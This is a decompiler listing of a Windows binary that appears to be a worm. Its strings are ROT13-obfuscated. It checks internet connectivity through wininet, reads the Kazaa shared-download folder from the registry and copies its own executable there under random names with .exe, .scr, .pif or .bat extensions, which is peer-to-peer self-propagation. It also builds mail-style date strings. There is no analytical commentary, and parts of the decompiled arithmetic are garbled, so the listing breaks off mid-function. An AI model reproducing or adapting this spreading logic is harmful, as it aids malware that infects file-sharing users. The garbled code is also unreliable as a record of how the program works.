    004a4592: (save)ebx;
    004a4593: (save)A8;
    004a4594: (save)edi;
    004a459f: *(A8 + 4) = *__imp__GetTickCount();
    004a45a2: L004A4076(A8);
    004a45a7: edi = 0;
    004a45ac: if(*A8 == 0) {
        004a45ae: (save)A8;
        004a45af: eax = L004A4129();
        004a45b7: if(eax != 0) {
            ff1000ed: goto L004a4629;
        }
    }
    004a45bb: ebx = __imp__CreateThread;
    004a45c1: if(*A8 != edi) {
        004a45c6: (save)ebp - 4;
        004a45c7: (save)edi;
        004a45c8: (save)edi;
        004a45c9: (save)0x4a43d5;
        004a45ce: (save)edi;
        004a45cf: (save)edi;
        004a45d0: *__imp__CreateThread();
    }
    004a45d3: L004A3F32(A8);
    004a45d8: (save)A8;
    004a45d9: eax = L004A434C();
    004a45e1: (restore)ecx;
    004a45e2: if(eax == 0) {
        004a45e5: L004A415F(A8);
        004a45eb: L004A42B1(A8);
        004a45f0: (save)A8;
        004a45f1: L004A438E();
        004a45f9: L004A4D83();
        004a45fe: L004A652A();
        004a4606: (save)ebp - 4;
        004a4607: (save)edi;
        004a4608: (save)edi;
        004a4609: (save)0x4a653c;
        004a460e: (save)edi;
        004a460f: (save)edi;
        004a4610: *ebx();
        004a4612: for(L004A6E25(); 1; *__imp__Sleep(1024)) {
            004a4617: L004A6E3A();
        }
    }
004a4629: L004a4629:
    004a4629: (restore)edi;
    004a462a: (restore)A8;
    004a462b: (restore)ebx;
}

/*	Procedure: 0x004A462E - 0x004A4686
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

__entry_point__()
{



    004a462e: (save)ebp;
    004a462f: ebp = esp;
    004a4631: esp = esp - 564;
    004a4637: (save)esi;
    004a4638: (save)edi;
    004a4639: L004A48B0();
    004a463e: L004A4687();
    004a4643: (save)564;
    004a464e: (save)0;
    004a4650: (save)ebp + -564;
    004a4651: memset();
    004a465b: edi = ebp - 16;
    004a465e: *edi = *L004A2A08;
    004a465e: edi = edi + 4;
    004a465f: *edi = *L004A2A0C;
    004a465f: edi = edi + 4;
    004a4660: *edi = *L004A2A10;
    004a4660: edi = edi + 4;
    004a4661: *edi = *L004A2A14;
    004a4661: edi = edi + 4;
    004a4661: esi = 0x4a2a18;
    004a4667: edi = ebp - 32;
    004a466a: *edi = *L004A2A18;
    004a466a: edi = edi + 4;
    004a466b: *edi = *L004A2A1C;
    004a466b: edi = edi + 4;
    004a466c: *edi = *L004A2A20;
    004a466c: edi = edi + 4;
    004a4674: *edi = *L004A2A24;
    004a4674: edi = edi + 4;
    004a4674: esi = 0x4a2a28;
    004a4675: L004A458E(ebp + -564);
    004a467d: (save)0;
    004a467f: *__imp__ExitProcess();
    004a4685: (restore)edi;
    004a4686: (restore)esi;
}

stack space not deallocated on return
/*	Procedure: 0x004A4687 - 0x004A46A0
 *	Argument size: 0
 *	Local size: 400
 *	Save regs size: 0
 */

L004A4687()
{



    004a46a0: return(*L004a1164(2, esp));
}

/*	Procedure: 0x004A46A1 - 0x004A471B
 *	Argument size: -52
 *	Local size: 56
 *	Save regs size: 0
 */

L004A46A1(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffe4;



    004a46a7: (save)esi;
    004a46a8: (save)edi;
    004a46a9: (save)6;
    004a46ab: esi = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    004a46b0: (restore)ecx;
    004a46b1: edi = & Vffffffe4;
    004a46b4: asm("rep movsd");
    004a46b6: *edi = *esi;
    004a46b6: edi = edi + 4;
    004a46b6: esi = esi + 4;
    004a46b8: *edi = *esi;
    004a46b8: edi = edi + 1;
    004a46b8: esi = esi + 1;
    004a46b9: (save)6;
    004a46bb: esi = "abcdefghijklmnopqrstuvwxyz";
    004a46c0: (restore)ecx;
    004a46c1: edi = & Vffffffc8;
    004a46c4: asm("rep movsd");
    004a46cc: *edi = *esi;
    004a46cc: edi = edi + 4;
    004a46cc: esi = esi + 4;
    004a46cf: *edi = *esi;
    004a46cf: edi = edi + 1;
    004a46cf: esi = esi + 1;
    004a46d0: eax = L004A491B( & Vffffffe4, A8);
    004a46d7: (restore)edi;
    004a46da: (restore)esi;
    004a46db: if(eax != 0) {
        004a46e0: (save)26;
        004a46e2: eax = eax - & Vffffffe4;
        004a46e4: (restore)ecx;
        004a46e5: eax = eax + 13;
        004a46e8: asm("cdq");
        004a46f0: return(*(ebp + ecx / ecx % ecx / ecx - 28));
    }
    004a46f1: (save)A8;
    004a46f8: eax = L004A491B( & Vffffffc8);
    004a4700: (restore)ecx;
    004a4701: if(eax != 0) {
        004a4706: (save)26;
        004a4708: eax = eax - & Vffffffc8;
        004a470a: (restore)ecx;
        004a470b: eax = eax + 13;
        004a470e: asm("cdq");
        004a4711: al = *(ebp + ecx / ecx % ecx / ecx - 56);
        004a4715: esp = ebp;
        004a4716: return;
    }
    004a471a: esp = ebp;
    004a471b: return(A8);
}

/*	Procedure: 0x004A471C - 0x004A4742
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 4
 */

L004A471C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;



    004a471d: esi = Ac;
    004a4721: (save)edi;
    004a4722: edi = A8;
    004a472a: if(*esi != 0) {
        004a472c: do {
            004a472c: (save)eax;
            004a472d: esi = esi + 1;
            004a4733: *edi = L004A46A1();
            004a4735: al = *esi;
            004a4737: edi = edi + 1;
        } while(al != 0);
    }
    004a473d: *edi = 0;
    004a4740: (restore)edi;
}

/*	Procedure: 0x004A4743 - 0x004A48AF
 *	Argument size: 8
 *	Local size: 272
 *	Save regs size: 8
 */

L004A4743(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffef0;
	/* unknown */ void  Vffffff98;
	/* unknown */ void  Vffffff9c;
	/* unknown */ void  Vffffffa4;
	/* unknown */ void  Vffffffa8;
	/* unknown */ void  Vffffffac;
	/* unknown */ void  Vffffffb0;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff2;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff6;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffa;
	/* unknown */ void  Vfffffffc;



    004a474e: edi = 0;
    004a4750: Vffffffd4 = "Sun";
    004a475a: Vffffffd8 = "Mon";
    004a4761: Vffffffdc = "Tue";
    004a4768: Vffffffe0 = "Wed";
    004a476f: Vffffffe4 = "Thu";
    004a4776: Vffffffe8 = "Fri";
    004a477d: Vffffffec = "Sat";
    004a4784: Vffffffa4 = "Jan";
    004a478b: Vffffffa8 = "Feb";
    004a4792: Vffffffac = "Mar";
    004a4799: Vffffffb0 = "Apr";
    004a47a0: Vffffffb4 = "May";
    004a47a7: Vffffffb8 = "Jun";
    004a47ae: Vffffffbc = "Jul";
    004a47b5: Vffffffc0 = "Aug";
    004a47bc: Vffffffc4 = "Sep";
    004a47c3: Vffffffc8 = "Oct";
    004a47ca: Vffffffcc = "Nov";
    004a47d1: Vffffffd0 = "Dec";
    004a47d8: if(A8 == 0) {
        004a47dd: (save) & Vfffffff0;
        004a47de: *__imp__GetLocalTime();
    } else {
        004a47e9: (save) & Vffffff9c;
        004a47ea: (save)A8;
        004a47ed: *__imp__FileTimeToLocalFileTime();
        004a47f6: (save) & Vfffffff0;
        004a47fa: (save) & Vffffff9c;
        004a47fb: *__imp__FileTimeToSystemTime();
    }
    004a4807: Vfffffef0 = edi;
    004a480d: (save) & Vfffffef0;
    004a4814: ecx = Vfffffef0;
    004a481d: if(*__imp__GetTimeZoneInformation() == 2) {
    }
    004a4824: ecx = ~ecx;
    004a4826: esi = ecx;
    004a4828: if(!(ecx = ecx + Vffffff98)) {
        004a482a: esi = ~esi;
    }
    004a4831: if(Vfffffff4 > 6) {
        004a4833: Vfffffff4 = 6;
    }
    004a483d: if(Vfffffff2 == di) {
        004a483f: Vfffffff2 = 1;
    }
    004a484a: if(Vfffffff2 > 12) {
        004a484c: Vfffffff2 = 12;
    }
    004a4854: ecx = "+";
    004a4859: if(ecx < edi) {
        004a485b: ecx = "-";
    }
    004a4860: eax = esi;
    004a4862: (save)60;
    004a4864: asm("cdq");
    004a4865: (restore)edi;
    004a4866: edi = edi / edi;
    004a4866: edx = edi % edi;
    004a4868: eax = esi;
    004a486a: (save)edx;
    004a486b: (save)edi;
    004a486c: asm("cdq");
    004a486d: (restore)esi;
    004a486e: edx = esi / esi % esi / esi;
    004a4870: (save)eax;
    004a4871: (save)ecx;
    004a4876: (save)Vfffffffc & 65535;
    004a487b: (save)Vfffffffa & 65535;
    004a4880: (save)Vfffffff8 & 65535;
    004a4885: (save)Vfffffff0 & 65535;
    004a488a: (save) *(ebp + (Vfffffff2 & 65535) * 4 - 96);
    004a4892: (save)Vfffffff6 & 65535;
    004a4897: (save) *(ebp + (Vfffffff4 & 65535) * 4 - 44);
    004a489b: (save)"%s, %u %s %u %.2u:%.2u:%.2u %s%.2u%.2u";
    004a48a0: (save)Ac;
    004a48a9: esp = esp + 48;
    004a48af: return(*__imp__wsprintfA());
}

/*	Procedure: 0x004A48B0 - 0x004A48BB
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A48B0()
{



    004a48b0: eax = *__imp__GetTickCount();
    004a48b6: *L004A8B00 = eax;
    004a48bb: return(*L004A8B00);
}

/*	Procedure: 0x004A48BC - 0x004A48D0
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 0
 */

L004A48BC()
{



    004a48bc: eax = *L004A8B00;
    004a48c1: 22695477 = eax * eax;
    004a48c7: eax = eax + 1;
    004a48c8: *L004A8B00 = eax;
    004a48d0: return(*L004A8B00 >> 16);
}

/*	Procedure: 0x004A48D1 - 0x004A48E8
 *	Argument size: 0
 *	Local size: 0
 *	Save regs size: 4
 */

L004A48D1()
{
	/* unknown */ void  esi;



    004a48d2: L004A48BC();
    004a48da: esi = (ax & 65535) << 16;
    004a48dd: L004A48BC();
    004a48e8: return(ax & 65535 | esi);
}

/*	Procedure: 0x004A48E9 - 0x004A491A
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004A48E9(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    004a48e9: eax = A4;
    004a48ed: for((save)esi; *eax != 0; eax = eax + 1) {
        004a48f4: edx = A8;
        004a48f8: esi = eax;
        004a48fa: do {
            004a48fa: cl = *edx;
            004a48fe: if(cl == 0 || *esi != cl) {
                ff10010b: break;
            }
            004a4904: esi = esi + 1;
            004a4905: edx = edx + 1;
        } while(*esi != 0);
        004a490d: if(esi == edx || *edx == 0) {
            ff100111: goto L004a4919;
        }
    }
    004a4917: eax = 0;
004a4919: L004a4919:
    004a4919: (restore)esi;
}

/*	Procedure: 0x004A491B - 0x004A493C
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004A491B(A4, A8)
/* unknown */ void  A4;
/* unknown */ void  A8;
{



    004a491b: for(eax = A4; 1; eax = eax + 1) {
        004a491f: cl = *eax;
        004a4923: if(cl == 0 || cl == A8) {
            ff100115: break;
        }
    }
    004a4934: cl = ~( *eax - A8);
    004a4936: asm("sbb ecx,ecx");
    004a493c: return(eax & !ecx);
}

/*	Procedure: 0x004A493D - 0x004A498C
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L004A493D(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    004a4940: eax = A10;
    004a4943: A10 = A10 - 1;
    004a4946: (save)ebx;
    004a4947: (save)esi;
    004a494a: (save)edi;
    004a494b: if(eax != 0) {
        004a494d: esi = __imp__tolower;
        004a4953: ebx = A8;
        004a4956: do {
            004a4959: edi = *ebx & 255;
            004a495f: ebx = ebx + 1;
            004a4960: Ac = Ac + 1;
            004a4963: (save) *Ac & 255;
            004a4968: (save)edi;
            004a4969: A8 = *esi();
            004a496c: eax = *esi();
            004a496e: (restore)ecx;
            004a4975: if(eax != A8) {
                ff10011b: goto L004a4988;
            }
            004a4977: eax = A10;
            004a497a: A10 = A10 - 1;
        } while(eax != 0);
    }
    004a4981: eax = 0;
004a4983: L004a4983:
    004a4983: (restore)edi;
    004a4984: (restore)esi;
    004a4985: (restore)ebx;
    004a4987: return;
004a4988: L004a4988:
    004a498a: eax = 1;
    004a498b: goto L004a4983;
}

/*	Procedure: 0x004A498D - 0x004A49BF
 *	Argument size: 12
 *	Local size: 0
 *	Save regs size: 0
 */

L004A498D(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    004a4994: if(A10 == 0) {
        004a4999: return(0);
    }
    004a499d: edx = Ac;
    004a49a0: ecx = A8;
    004a49a3: if(!(A10 = A10 - 1)) {
        004a49a5: do {
            004a49a5: al = *ecx;
            004a49a9: if(al == 0 || al != *edx) {
                ff100123: break;
            }
            004a49af: ecx = ecx + 1;
            004a49b0: edx = edx + 1;
        } while(A10 = A10 - 1);
    }
    004a49b6: eax = *ecx & 255;
    004a49bf: return(eax - ( *edx & 255));
}

/*	Procedure: 0x004A49C0 - 0x004A4B59
 *	Argument size: 4
 *	Local size: 36
 *	Save regs size: 4
 */

L004A49C0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffdd;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a49c7: ebx = A8;
    004a49ca: (save)esi;
    004a49cb: esi = 0;
    004a49d0: Vfffffff8 = 0;
    004a49d3: if(*ebx != 0) {
        004a49d9: (save)edi;
        004a49da: do {
            004a49de: if(*(esi + ebx) == 38) {
                004a49e4: edi = esi;
                004a49e6: esi = esi + 1;
                004a49e7: Vfffffff4 = edi;
                004a49ea: A8 = esi;
                004a49f1: if(*(esi + ebx) == 35) {
                    004a49f7: A8 = 0;
                    004a49fb: esi = esi + 1;
                    004a49fc: do {
                        004a4a04: if(*__imp____mb_cur_max <= 1) {
                            004a4a1d: eax = *(esi + ebx);
                            004a4a26: eax = *( *__imp___pctype + eax * 2) & 4;
                        } else {
                            004a4a0d: eax = *__imp___isctype( *(esi + ebx), 4);
                        }
                        004a4a2b: if(eax == 0) {
                            ff100131: break;
                        }
                        004a4a2d: ecx = A8;
                        004a4a30: al = *(esi + ebx);
                        004a4a33: A8 = A8 + 1;
                        004a4a36: esi = esi + 1;
                        004a4a3b: *(ebp + ecx - 36) = al;
                    } while(A8 < 15);
                    004a4a44: *(ebp + A8 - 36) = 0;
                    004a4a49: dl = Vffffffdc;
                    004a4a4c: eax = 0;
                    004a4a50: Vfffffffc = 0;
                    004a4a53: if(dl != 0) {
                        004a4a55: ecx = & Vffffffdc;
                        004a4a58: do {
                            004a4a58: edx = dl;
                            004a4a5b: eax = eax + eax * 4;
                            004a4a5e: ecx = ecx + 1;
                            004a4a5f: eax = edx + eax * 2 - 48;
                            004a4a63: dl = *ecx;
                        } while(dl != 0);
                        004a4a69: Vfffffffc = eax;
                    }
                    004a4a70: if(*(esi + ebx) == 59) {
                        004a4a72: esi = esi + 1;
                    }
                    004a4a75: if(eax > 0) {
                        004a4a83: memset( & Vffffffdc, 0, 20);
                        004a4a93: if(Vfffffffc >= 256) {
                            004a4aa3: (save)0;
                            004a4aa4: (save)0;
                            004a4aa5: (save)20;
                            004a4aa7: (save) & Vffffffdc;
                            004a4aab: (save)1;
                            004a4aad: (save) & Vfffffffc;
                            004a4aae: (save)0;
                            004a4aaf: (save)0;
                            004a4ab0: *__imp__WideCharToMultiByte();
                        } else {
                            004a4a95: Vffffffdd = 0;
                            004a4a99: Vffffffdc = al;
                        }
                        004a4aba: if(Vffffffdc != 0) {
                            004a4ac3: esi = esi - edi;
                            004a4ac5: (save) & Vffffffdc;
                            004a4ac6: A8 = esi;
                            004a4ac9: eax = *__imp__lstrlenA();
                            004a4ad1: Vfffffff0 = eax;
                            004a4ad4: if(esi != eax) {
                                004a4ad6: esi = esi + edi;
                                004a4ad8: edi = edi + eax;
                                004a4ada: (save)ebx;
                                004a4adb: esi = esi + ebx;
                                004a4add: edi = edi + ebx;
                                004a4ae9: edi :: esi;
                                004a4aef: if(ecx = *__imp__lstrlenA() + ebx - esi + 1) {
                                    004a4b0c: eax = ecx - 1;
                                    004a4b11: if(eax >= 0) {
                                        004a4b13: ecx = edi + eax;
                                        004a4b16: esi = esi - edi;
                                        004a4b18: edi = eax + 1;
                                        004a4b1b: do {
                                            004a4b1e: *ecx = *(esi + ecx);
                                            004a4b20: ecx = ecx - 1;
                                        } while(edi = edi - 1);
                                    }
                                } else {
                                    004a4af1: edi = 0;
                                    004a4af5: if(ecx > 0) {
                                        004a4afc: eax = esi - A8 + Vfffffff0;
                                        004a4aff: do {
                                            004a4b02: *eax = *(esi + edi);
                                            004a4b04: eax = eax + 1;
                                            004a4b05: edi = edi + 1;
                                        } while(edi < ecx);
                                    }
                                }
                                004a4b24: edi = Vfffffff4;
                            }
                            004a4b2a: (save) & Vffffffdc;
                            004a4b3a: memcpy(edi + ebx, & Vffffffdc, *__imp__lstrlenA());
                            004a4b42: Vfffffff8 = Vfffffff8 + 1;
                            004a4b45: esi = edi;
                        }
                    }
                }
            }
            004a4b47: esi = esi + 1;
        } while(*(esi + ebx) != 0);
        004a4b52: (restore)edi;
    }
    004a4b56: (restore)esi;
    004a4b59: return(Vfffffff8);
}

/*	Procedure: 0x004A4B5A - 0x004A4CED
 *	Argument size: 4
 *	Local size: 28
 *	Save regs size: 8
 */

L004A4B5A(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe5;
	/* unknown */ void  Vffffffe6;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a4b62: edi = A8;
    004a4b65: esi = 0;
    004a4b67: Vfffffffc = 0;
    004a4b6d: if(*edi != 0) {
        004a4b73: (save)ebx;
        004a4b74: do {
            004a4b78: if(*(esi + edi) == 37) {
                004a4b83: A8 = esi;
                004a4b86: *__imp____mb_cur_max :: 1;
                004a4b8d: Vfffffff8 = eax;
                004a4b90: if(eax = edi + esi + 1) {
                    004a4bac: ebx = 128;
                    004a4bb1: eax = *eax;
                    004a4bb9: eax = *( *__imp___pctype + eax * 2) & 128;
                } else {
                    004a4b92: eax = *eax;
                    004a4b95: ebx = 128;
                    004a4b9c: eax = *__imp___isctype(eax, 128);
                }
                004a4bc0: if(eax != 0) {
                    004a4bc6: eax = *(esi + edi + 1);
                    004a4bcb: esi = esi + 1;
                    004a4bcd: Vfffffff8 = esi;
                    004a4bd0: *__imp__toupper(eax);
                    004a4bd6: Vffffffe4 = al;
                    004a4be2: if(*__imp____mb_cur_max <= 1) {
                        004a4bfb: eax = *(edi + esi + 1);
                        004a4c05: eax = *( *__imp___pctype + eax * 2) & ebx;
                    } else {
                        004a4beb: eax = *__imp___isctype( *(edi + esi + 1), ebx);
                    }
                    004a4c09: if(eax != 0) {
                        004a4c0f: eax = *(esi + edi + 1);
                        004a4c14: esi = esi + 1;
                        004a4c16: *__imp__toupper(eax);
                        004a4c1c: Vffffffe6 = 0;
                        004a4c20: esi = esi + 1;
                        004a4c24: Vffffffe5 = al;
                        004a4c27: ecx = al < 65 || al > 90 ? al - 48 : al - 55;
                        004a4c3b: al = Vffffffe4;
                        004a4c40: eax = al < 65 || al > 90 ? al - 48 : al - 55;
                        004a4c5b: if(ecx + (eax << 4) > 0) {
                            004a4c5d: ebx = A8;
                            004a4c60: Vffffffe5 = 0;
                            004a4c67: Vffffffe4 = cl;
                            004a4c6a: (save) & Vffffffe4;
                            004a4c6b: esi = esi - ebx;
                            004a4c6d: eax = *__imp__lstrlenA();
                            004a4c75: if(esi != eax) {
                                004a4c77: eax = eax + ebx;
                                004a4c7b: (save)edi;
                                004a4c7c: esi = esi + ebx + edi;
                                004a4c7e: ebx = eax + edi;
                                004a4c8b: ebx :: esi;
                                004a4c91: if(eax = *__imp__lstrlenA() + edi - esi + 1) {
                                    004a4ca4: eax = eax - 1;
                                    004a4ca7: if(eax >= 0) {
                                        004a4ca9: ecx = eax + ebx;
                                        004a4cac: esi = esi - ebx;
                                        004a4cae: eax = eax + 1;
                                        004a4caf: do {
                                            004a4cb2: *ecx = *(esi + ecx);
                                            004a4cb4: ecx = ecx - 1;
                                        } while(eax = eax - 1);
                                    }
                                } else {
                                    004a4c95: if(eax > 0) {
                                        004a4c97: ebx = ebx - esi;
                                        004a4c99: do {
                                            004a4c9b: *(ebx + esi) = *esi;
                                            004a4c9e: esi = esi + 1;
                                        } while(eax = eax - 1);
                                    }
                                }
                                004a4cb8: ebx = A8;
                            }
                            004a4cbe: (save) & Vffffffe4;
                            004a4cce: memcpy(ebx + edi, & Vffffffe4, *__imp__lstrlenA());
                            004a4cd6: Vfffffffc = Vfffffffc + 1;
                            004a4cd9: esi = ebx;
                        }
                    }
                }
            }
            004a4cdb: esi = esi + 1;
        } while(*(esi + edi) != 0);
        004a4ce6: (restore)ebx;
    }
    004a4ced: return(Vfffffffc);
}

/*	Procedure: 0x004A4CEE - 0x004A4D63
 *	Argument size: 0
 *	Local size: 68
 *	Save regs size: 4
 */

L004A4CEE()
{
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vfffffffc;



    004a4cf8: (save)"jvavarg.qyy";
    004a4cfe: L004A471C( & Vffffffbc);
    004a4d07: (restore)ecx;
    004a4d08: (save) & Vffffffbc;
    004a4d0f: esi = *__imp__GetModuleHandleA();
    004a4d13: if(esi != 0 && esi != -1) {
        ff100175: goto L004a4d2f;
    }
    004a4d1d: (save) & Vffffffbc;
    004a4d24: esi = *__imp__LoadLibraryA();
    004a4d28: if(esi != 0) {
        004a4d2d: if(esi == -1) {
            ff100179: goto L004a4d5e;
        }
004a4d2f: L004a4d2f:
        004a4d32: (save)"VagreargTrgPbaarpgrqFgngr";
        004a4d38: L004A471C( & Vffffffbc);
        004a4d41: (restore)ecx;
        004a4d42: (save) & Vffffffbc;
        004a4d43: (save)esi;
        004a4d44: eax = *__imp__GetProcAddress();
        004a4d4c: if(eax == 0) {
            ff10017b: goto L004a4d5e;
        }
        004a4d56: eax = ~( *eax( & Vfffffffc, 0));
        004a4d58: asm("sbb eax,eax");
        004a4d5a: eax = ~eax;
    } else {
004a4d5e: L004a4d5e:
        004a4d60: eax = 2;
    }
}

stack space not deallocated on return
/*	Procedure: 0x004A4D64 - 0x004A4D82
 *	Argument size: 4
 *	Local size: 0
 *	Save regs size: 0
 */

L004A4D64(Ac)
/* unknown */ void  Ac;
{



    004a4d68: (save) & Ac;
    004a4d69: (save)Ac;
    004a4d6d: (save)Ac;
    004a4d82: return(*__imp__wvsprintfA( *__imp__lstrlenA() + Ac));
}

/*	Procedure: 0x004A4D83 - 0x004A4DAE
 *	Argument size: -260
 *	Local size: 260
 *	Save regs size: 0
 */

L004A4D83()
{
	/* unknown */ void  Vfffffefc;



    004a4d92: (save)260;
    004a4d97: (save) & Vfffffefc;
    004a4d98: (save)0;
    004a4d9a: *__imp__GetModuleFileNameA();
    004a4dae: return(L004A4DAF( & Vfffffefc));
}

/*	Procedure: 0x004A4DAF - 0x004A4F72
 *	Argument size: 4
 *	Local size: 360
 *	Save regs size: 4
 */

L004A4DAF(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  Vfffffe98;
	/* unknown */ void  Vfffffed8;
	/* unknown */ void  Vfffffef8;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    004a4dc5: Vfffffff8 = 256;
    004a4dcc: L004A471C( & Vfffffe98, "Fbsgjner\Xnmnn\Genafsre");
    004a4ddd: L004A471C( & Vfffffed8, "QyQve0");
    004a4de2: (save)Vfffffff8;
    004a4de5: ebx = 0;
    004a4ded: (save)0;
    004a4dee: (save) & Vfffffef8;
    004a4def: memset();
    004a4df4: esp = esp + 28;
    004a4dfa: (save) & Vfffffffc;
    004a4dfb: (save)1;
    004a4e03: (save)ebx;
    004a4e04: (save) & Vfffffe98;
    004a4e05: (save)-2147483647;
    004a4e0a: eax = *__imp__RegOpenKeyExA();
    004a4e12: if(eax == 0) {
        004a4e1b: (save) & Vfffffff8;
        004a4e22: (save) & Vfffffef8;
        004a4e23: (save)ebx;
        004a4e2a: (save)ebx;
        004a4e2b: (save) & Vfffffed8;
        004a4e2c: (save)Vfffffffc;
        004a4e2f: eax = *__imp__RegQueryValueExA();
        004a4e37: if(eax == 0) {
            004a4e3d: (save)Vfffffffc;
            004a4e40: eax = *__imp__RegCloseKey();
            004a4e4c: if(Vfffffef8 != bl) {
                004a4e52: (save)esi;
                004a4e59: (save)edi;
                004a4e5a: edi = __imp__lstrlenA;
                004a4e60: (save) & Vfffffef8;
                004a4e6b: if(*(ebp + *__imp__lstrlenA() + -265) == 47) {
                    004a4e73: (save) & Vfffffef8;
                    004a4e76: *(ebp + *edi() + -265) = 92;
                }
                004a4e84: (save) & Vfffffef8;
                004a4e8f: esi = __imp__lstrcatA;
                004a4e95: if(*(ebp + *edi() + -265) != 92) {
                    004a4e9d: (save)0x4a2a28;
                    004a4ea2: (save) & Vfffffef8;
                    004a4ea3: *__imp__lstrcatA();
                }
                004a4ea5: L004A48BC();
                004a4eaa: eax = ax & 65535;
                004a4ead: (save)7;
                004a4eaf: asm("cdq");
                004a4eb0: (restore)ecx;
                004a4eb1: edx = ecx / ecx % ecx / ecx;
                004a4eb9: (save) *(edx * 4 + 0x4a1180);
                004a4ec0: (save) & Vfffffef8;
                004a4ecb: L004A471C(ebp + *edi() + -264);
                004a4ed7: (restore)ecx;
                004a4ed8: (save)".";
                004a4edd: (save) & Vfffffef8;
                004a4ede: *esi();
                004a4ee0: L004A48BC();
                004a4ee5: eax = ax & 65535;
                004a4ee8: (save)6;
                004a4eea: asm("cdq");
                004a4eeb: (restore)ecx;
                004a4eec: edx = ecx / ecx % ecx / ecx;
                004a4ef0: if(edx >= ebx) {
                    004a4ef5: if(edx > 1) {
                        004a4efa: if(edx > 3) {
                            004a4eff: if(edx != 4) {
                                ff10018d: goto L004a4f40;
                            }
                            004a4f07: (save)"pi";
                            004a4f0c: (save) & Vfffffef8;
                            004a4f0d: *esi();
                            004a4f0f: (save)"f";
                        } else {
                            004a4f1c: (save)"sc";
                            004a4f21: (save) & Vfffffef8;
                            004a4f22: *esi();
                            004a4f24: (save)"r";
                        }
                    } else {
                        004a4f31: (save)"ex";
                        004a4f36: (save) & Vfffffef8;
                        004a4f37: *esi();
                        004a4f39: (save)"e";
                    }
                } else {
004a4f40: L004a4f40:
                    004a4f46: (save)"ba";
                    004a4f4b: (save) & Vfffffef8;
                    004a4f4c: *esi();
                    004a4f4e: (save)"t";
                }
                004a4f59: (save) & Vfffffef8;
                004a4f5a: *esi();
                004a4f68: eax = *__imp__CopyFileA(A8, & Vfffffef8, 1);
                004a4f6e: (restore)edi;
                004a4f6f: (restore)esi;
            }
        }
    }
}

/*	Procedure: 0x004A4F73 - 0x004A4FA8
 *	Argument size: 8
 *	Local size: 0
 *	Save regs size: 0
 */

L004A4F73(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    004a4f76: (save)ecx;
    004a4f77: (save)esi;
    004a4f78: esi = 0;
    004a4f7a: do {
        004a4f84: eax = L004A4FA9(A8, Ac, ebp - 4);
        004a4f8e: if(eax != 0) {
            ff10018f: goto L004a4fa6;
        }
        004a4f94: if(*(ebp - 4) == 2) {
            ff100191: break;
        }
        004a4f98: *__imp__Sleep(100);
        004a4f9e: esi = esi + 1;
    } while(esi < 2);
    004a4fa4: eax = 0;
004a4fa6: L004a4fa6:
    004a4fa6: (restore)esi;
}

stack space not deallocated on return
/*	Procedure: 0x004A4FA9 - 0x004A5240
 *	Argument size: 316
 *	Local size: 0
 *	Save regs size: 0
 */

L004A4FA9(Ac, A10, A14, A18, A1c, A20, A24, A28, A2c, A30, A38, A3c, A40, A44, A48, A144)
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
/* unknown */ void  A18;
/* unknown */ void  A1c;
/* unknown */ void  A20;
/* unknown */ void  A24;
/* unknown */ void  A28;
/* unknown */ void  A2c;
/* unknown */ void  A30;
/* unknown */ void  A38;
/* unknown */ void  A3c;
/* unknown */ void  A40;
/* unknown */ void  A44;
/* unknown */ void  A48;
/* unknown */ void  A144;
{



    004a4fad: esp = esp - 296;
    004a4fb3: (save)ebx;
    004a4fb4: (save)ebp;
    004a4fb5: (save)esi;
    004a4fb6: esi = __imp__GetProcessHeap;
    004a4fbc: (save)edi;
    004a4fbd: ebp = 0;
    004a4fbf: (save)4096;
    004a4fc4: (save)0;
    004a4fc5: *Ac = 1;
    004a4fcd: (save) *__imp__GetProcessHeap();
    004a4fd4: ebx = *__imp__HeapAlloc();
    004a4fd8: if(ebx != ebp) {
        004a4fde: (save)17;
        004a4fe0: (save)2;
        004a4fe2: (save)2;
